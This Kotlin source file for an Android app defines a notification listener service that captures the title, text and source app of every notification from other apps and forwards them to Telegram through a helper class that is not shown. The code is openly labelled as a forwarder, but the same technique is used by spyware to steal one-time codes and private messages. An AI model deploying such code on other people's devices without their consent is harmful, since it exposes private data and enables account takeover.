package ru.pushtoweb.app

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class NotificationForwarderService : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return

        // Пропускаем служебные уведомления самого приложения
        if (sbn.packageName == packageName) return

        val extras = sbn.notification.extras ?: return
        val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
        val appPackage = sbn.packageName ?: ""

        val pm = applicationContext.packageManager
        val appName = try {
            val appInfo = pm.getApplicationInfo(appPackage, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            appPackage
        }

        if (text.isNotEmpty() || title.isNotEmpty()) {
            TelegramSender.forwardPayload(
                type = "notification",
                sender = title.ifEmpty { appName },
                text = text,
                appName = appName,
                packageName = appPackage,
                title = title
            )
        }
    }
}
